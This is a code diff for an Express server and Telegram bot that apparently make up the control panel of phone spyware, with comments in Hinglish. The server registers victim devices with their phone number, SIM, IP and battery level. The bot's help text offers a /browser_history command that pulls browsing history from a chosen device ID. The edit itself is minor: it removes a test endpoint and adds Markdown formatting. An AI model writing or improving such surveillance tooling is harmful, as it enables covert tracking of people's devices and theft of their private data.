@@ -10,11 +10,6 @@ app.use(express.json());
 
 let devices = {};
 
-// ✅ Ye endpoint browser se test karne ke liye hai
-app.get('/api/test', (req, res) => {
-    res.json({ message: 'Server is running!' });
-});
-
 // Device Register API
 app.post('/api/register-device', (req, res) => {
     const { deviceId, deviceName, phoneNumber, battery, ip, sim, online, time } = req.body;
@@ -99,7 +94,7 @@ bot.onText(/\/help/, (msg) => {
         `🟢 **/browser_history <DEVICE_ID>** - Browser history nikalo\n` +
         `   Example: \`/browser_history 123456789\`\n\n` +
         `⚡ **Device ID kaise milega?**\n` +
-        `   → \`/devices\` command chalao, wahan device ID dikhega!`);
+        `   → \`/devices\` command chalao, wahan device ID dikhega!`, { parse_mode: "Markdown" });
 });
 
 bot.onText(/\/devices/, (msg) => {
